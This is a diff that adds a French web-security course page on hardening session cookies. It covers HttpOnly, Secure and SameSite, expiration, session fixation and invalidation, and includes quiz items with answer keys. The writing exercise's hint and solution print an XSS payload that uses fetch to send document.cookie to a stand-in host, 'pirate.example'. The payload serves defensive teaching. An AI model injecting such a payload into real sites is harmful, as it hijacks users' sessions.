@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Leçon 6</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<script>
+var DAY = {
+  num: 6,
+  title: "Sessions et cookies : HttpOnly, Secure, SameSite",
+  subtitle: "Le cookie de session EST l'identité — le voler, c'est devenir la victime.",
+  theory: `
+<h3>1. Pourquoi c'est critique</h3>
+<p>Petit rappel. Une <strong>session</strong> est la « mémoire » qui fait que le site continue de te reconnaître de page en page après ta connexion (sinon il faudrait retaper son mot de passe à chaque clic). Cette reconnaissance repose sur un <strong>cookie de session</strong> : un petit identifiant que ton navigateur renvoie automatiquement à chaque requête, et qui sert de « bracelet d'entrée ». Le voler, c'est entrer à la place de la victime <strong>sans mot de passe</strong> — ni le hachage ni le MFA (leçon 5) n'y changent rien, puisqu'on court-circuite l'étape de connexion. Protéger ce cookie est donc aussi important que protéger le mot de passe lui-même.</p>
+
+<h3>2. Les quatre attributs qui sauvent</h3>
+<p>Un cookie peut porter des <strong>attributs</strong> — des options qui indiquent au navigateur comment le traiter. Quatre d'entre eux ferment chacun une menace différente :</p>
+<pre class="pseudo">HttpOnly : le JavaScript ne peut PAS lire le cookie   # un XSS (leçon 3) ne peut donc plus le voler
+Secure   : le cookie ne part que sur HTTPS            # pas d'interception en clair sur le reseau
+SameSite : le cookie ne part pas cross-site           # barriere anti-CSRF (leçon 4)
+Expiration : le cookie finit par mourir               # limite la duree pendant laquelle un vol reste utile</pre>
+<pre class="pseudo"># settings.py (fichier de configuration du projet)
+SESSION_COOKIE_HTTPONLY = True             # interdit l'acces au cookie depuis le JavaScript
+SESSION_COOKIE_SECURE = True               # n'envoie le cookie que sur une connexion HTTPS
+SESSION_COOKIE_SAMESITE = "Lax"            # ne l'envoie pas lors d'une requete venue d'un autre site
+SESSION_COOKIE_AGE = 60 * 60 * 8           # duree de vie : 8 heures (60*60*8 = 28800 secondes)
+SESSION_EXPIRE_AT_BROWSER_CLOSE = True     # la session meurt aussi a la fermeture du navigateur</pre>
+
+<h3>3. La fixation de session</h3>
+<p>La <strong>fixation de session</strong> est une attaque où l'attaquant impose à la victime un identifiant de session qu'il connaît déjà, AVANT même qu'elle se connecte. Comme cet identifiant ne change pas au login, l'attaquant se retrouve connecté avec le même « bracelet ». La parade : <strong>régénérer</strong> (fabriquer un nouvel) identifiant de session au moment précis de la connexion, pour que l'ancien ne vaille plus rien.</p>
+<pre class="pseudo">Attaque : l'attaquant fixe a l'avance un identifiant de session connu de lui   # par ex. via un lien piege
+la victime se connecte avec CET identifiant -> l'attaquant est connecte aussi  # ils partagent le meme "bracelet"
+Parade : REGENERER l'identifiant de session au moment du login                 # l'ancien identifiant devient inutile</pre>
+<pre class="pseudo">def connexion(request):
+    ...
+    login(request, user)        # Django recree (cycle) la cle de session lors du login
+    # (equivalent explicite si besoin : request.session.cycle_key())</pre>
+
+<h3>4. Invalider quand il le faut</h3>
+<p><strong>Invalider</strong> une session = la détruire pour de bon côté serveur, et pas seulement « oublier » le cookie côté navigateur.</p>
+<pre class="pseudo">- a la deconnexion : detruire la session (pas juste "oublier" le cookie)   # sinon la session reste valable
+- au changement de mot de passe : invalider TOUTES les sessions actives     # ejecte un intrus deja connecte
+- apres inactivite : expiration cote serveur                                # une session laissee ouverte se referme seule
+- possibilite de "deconnecter tous les appareils"                           # permet a l'utilisateur de reprendre le controle</pre>
+
+<h3>5. Où vit la session ?</h3>
+<p>Deux modèles. Soit les données de session restent <strong>côté serveur</strong> et le cookie ne transporte qu'un identifiant. Soit elles voyagent <strong>côté client</strong> (dans un cookie signé, ou un <strong>JWT</strong> — un jeton signé, voir leçon 8) ; il faut alors les <strong>signer</strong> pour garantir leur <em>intégrité</em> (empêcher le client de les modifier), et gérer leur expiration ainsi que leur <strong>révocation</strong> (le moyen d'annuler un jeton avant son échéance).</p>
+<pre class="pseudo">Cote serveur (Django par defaut) : le cookie ne porte qu'un IDENTIFIANT   # les donnees restent en base
+                                   -> le client ne peut rien falsifier    # il ne voit qu'un numero opaque
+Cote client (cookie signe / JWT) : les donnees voyagent chez le client    # d'ou la necessite de...
+                                   -> les SIGNER (integrite) + gerer expiration/revocation   # sinon elles seraient falsifiables</pre>
+<div class="warn">Un cookie de session <strong>sans HttpOnly</strong> transforme n'importe quel XSS en vol de compte : <code>document.cookie</code> part chez l'attaquant. HttpOnly ne coûte qu'un booléen et ferme cette chaîne d'attaque entière — c'est le meilleur rapport effort/protection du cours.</div>
+<div class="tip">Toutes les piles : Java (<code>http-only</code>, <code>secure</code>, <code>changeSessionId</code>), C# (<code>CookieHttpOnly</code>, <code>SecurePolicy.Always</code>), PHP (<code>session.cookie_httponly</code>, <code>session_regenerate_id(true)</code>). Quatre attributs, partout les mêmes.</div>`,
+  exercises: [
+    { type: "qcm", q: "Voler le cookie de session donne…", opts: ["Un indice", "L'accès complet sans mot de passe", "Le hachage", "Rien"], a: 1, exp: "Le cookie EST l'identité." },
+    { type: "qcm", q: "HttpOnly empêche…", opts: ["Le HTTPS", "Le JavaScript de lire le cookie (anti-XSS)", "Le CSRF", "L'expiration"], a: 1, exp: "document.cookie inaccessible." },
+    { type: "qcm", q: "Secure fait que le cookie…", opts: ["Part partout", "Ne part que sur HTTPS", "Est chiffré côté client", "Ne meurt jamais"], a: 1, exp: "Anti-interception." },
+    { type: "qcm", q: "SameSite sur le cookie de session sert surtout contre…", opts: ["Le XSS", "Le CSRF", "L'injection", "La force brute"], a: 1, exp: "Barrière cross-site (leçon 4)." },
+    { type: "qcm", q: "L'expiration du cookie…", opts: ["Est inutile", "Limite la fenêtre d'exploitation d'un vol", "Ralentit le site", "Chiffre"], a: 1, exp: "Une session éternelle est un risque." },
+    { type: "qcm", q: "La fixation de session, c'est…", opts: ["Un cookie trop long", "L'attaquant impose à l'avance un identifiant, la victime s'y connecte", "Un XSS", "Un mot de passe faible"], a: 1, exp: "Identifiant partagé." },
+    { type: "qcm", q: "La parade à la fixation :", opts: ["Régénérer l'identifiant de session au login", "Chiffrer le cookie", "HTTPS seul", "Un cookie de plus"], a: 0, exp: "cycle_key / changeSessionId." },
+    { type: "qcm", q: "Au changement de mot de passe, on doit…", opts: ["Ne rien faire", "Invalider toutes les sessions actives", "Envoyer le mot de passe par email", "Garder les sessions"], a: 1, exp: "Sinon l'attaquant reste connecté." },
+    { type: "qcm", q: "À la déconnexion :", opts: ["Oublier le cookie côté client", "Détruire la session côté serveur", "Rien", "Changer le mot de passe"], a: 1, exp: "Vraie invalidation." },
+    { type: "qcm", q: "Session côté serveur (Django) : le cookie porte…", opts: ["Toutes les données", "Un identifiant, les données restent en base", "Le mot de passe", "Le rôle en clair"], a: 1, exp: "Le client ne falsifie rien." },
+    { type: "qcm", q: "Une session côté client (JWT) doit être…", opts: ["En clair", "Signée (intégrité) + gérer l'expiration/révocation", "Publique", "Non expirante"], a: 1, exp: "Les données voyagent." },
+    { type: "vf", q: "Un cookie de session sans HttpOnly transforme un XSS en vol de compte.", a: true, exp: "document.cookie exfiltré." },
+    { type: "qcm", q: "En PHP, régénérer l'identifiant :", opts: ["session_regenerate_id(true)", "session_start seul", "setcookie", "header"], a: 0, exp: "Anti-fixation." },
+    { type: "qcm", q: "« Déconnecter tous les appareils » suppose…", opts: ["Rien", "Pouvoir invalider les sessions actives d'un compte", "Un XSS", "Un cookie permanent"], a: 1, exp: "Contrôle des sessions." },
+    { type: "vf", q: "HttpOnly a le meilleur rapport effort/protection : un booléen ferme une chaîne d'attaque entière.", a: true, exp: "À activer partout." }
+  ],
+  final: {
+    title: "Exercice final — Durcir le cookie de session",
+    intro: `<p>Le cookie de session est lisible en JS, voyage en clair et n'expire jamais.</p>`,
+    questions: [
+      { type: "qcm", q: "Contre le vol par XSS :", opts: ["SESSION_COOKIE_HTTPONLY = True", "un timeout long", "SameSite seul", "rien"], a: 0, exp: "JS ne lit plus le cookie." },
+      { type: "qcm", q: "Contre l'interception réseau :", opts: ["SESSION_COOKIE_SECURE = True (+ HTTPS)", "HttpOnly", "un log", "un cache"], a: 0, exp: "HTTPS uniquement." },
+      { type: "qcm", q: "Contre la fixation de session :", opts: ["Régénérer l'identifiant au login", "chiffrer le cookie", "rien", "un mot de passe fort"], a: 0, exp: "cycle_key." },
+      { type: "qcm", q: "Au changement de mot de passe :", opts: ["Invalider toutes les sessions actives", "les garder", "envoyer un SMS", "rien"], a: 0, exp: "Éjecter un éventuel intrus." },
+      { type: "vf", q: "Les quatre attributs (HttpOnly, Secure, SameSite, expiration) sont complémentaires.", a: true, exp: "Chacun sa menace." }
+    ],
+    solution: `<pre class="pseudo"># settings.py — cookie de session durci
+SESSION_COOKIE_HTTPONLY = True        # anti-XSS : le JS ne lit pas le cookie
+SESSION_COOKIE_SECURE = True          # HTTPS uniquement : pas d'interception en clair
+SESSION_COOKIE_SAMESITE = "Lax"       # anti-CSRF : pas d'envoi cross-site
+SESSION_COOKIE_AGE = 60 * 60 * 8      # expiration au bout de 8 h
+SESSION_EXPIRE_AT_BROWSER_CLOSE = True   # la session meurt a la fermeture du navigateur
+
+# login : la cle de session est regeneree (anti-fixation)
+login(request, user)                  # nouvel identifiant de session a chaque connexion
+# changement de mot de passe : invalider les autres sessions actives</pre>
+<p>La session est protégée. Demain : qui a le droit d'accéder à quoi — le contrôle d'accès.</p>`
+  }
+};
+</script>
+<script src="engine.js"></script>
+<script>
+var ECRITURE = {
+  placeholder: "Écris ton durcissement de session…",
+  items: [
+  { id: "secu-l6", title: "Le scénario du cookie volé", level: 3,
+    statement: "Raconte par écrit une chaîne d'attaque complète : un XSS (leçon 3) mal fermé permet de voler le cookie de session d'un admin. Montre le code de vol côté attaquant, explique pourquoi HttpOnly l'aurait empêché, puis liste les 5 durcissements qui, ensemble, réduisent à presque rien la valeur d'un cookie même volé (HttpOnly, Secure, SameSite, expiration courte, invalidation).",
+    hints: [
+      "Le vol : <script>fetch('//pirate/?c='+document.cookie)<\/script> — HttpOnly le rend vide.",
+      "Même volé, un cookie Secure ne s'utilise que sur HTTPS ; expiré, il ne vaut plus rien.",
+      "Défense en profondeur : chaque attribut réduit la valeur du cookie pour l'attaquant."
+    ],
+    solution: "# LA CHAÎNE D'ATTAQUE (sans durcissement)\n# 1. Un XSS stocké non fermé (leçon 3) dans une description :\n<script>fetch('https://pirate.example/?c=' + document.cookie)<\/script>\n# 2. Un admin ouvre la page -> son cookie de session part chez l'attaquant.\n# 3. L'attaquant colle ce cookie dans son navigateur -> il EST l'admin,\n#    sans mot de passe, sans MFA. Compromission totale.\n\n# POURQUOI HttpOnly CASSE LA CHAÎNE\n# Avec SESSION_COOKIE_HTTPONLY = True, document.cookie ne CONTIENT PAS\n# le cookie de session -> le fetch de vol récupère une chaîne vide.\n# L'XSS reste un problème (leçon 3), mais il ne donne plus la session.\n\n# LES 5 DURCISSEMENTS (défense en profondeur)\n# 1. HttpOnly     -> le JS ne peut pas lire le cookie (casse ce vol)\n# 2. Secure       -> même volé, inutilisable hors HTTPS\n# 3. SameSite=Lax -> pas d'usage cross-site abusif\n# 4. Expiration 8h + fermeture navigateur -> fenêtre de vol courte\n# 5. Invalidation -> « déconnecter tous les appareils » + au changement\n#    de mot de passe -> l'admin peut éjecter l'intrus\n\n# Résultat : chaque couche réduit la valeur d'un cookie volé.\n# Combinées, elles font qu'un vol devient difficile ET peu exploitable.",
+    note: "Ce scénario montre la défense en profondeur en action : on ne compte pas sur « le XSS n'arrivera jamais » (leçon 3), on rend le vol inexploitable même s'il arrive. HttpOnly casse ce vol précis, Secure et l'expiration réduisent la valeur du butin, l'invalidation permet de reprendre le contrôle. Aucune couche seule ne suffit — leur superposition, si." }
+  ]
+};
+</script>
+<script src="exo-ecriture.js"></script>
+<script src="fil-rouge-data.js"></script>
+<script src="fil-rouge.js"></script>
+</body>
+</html>
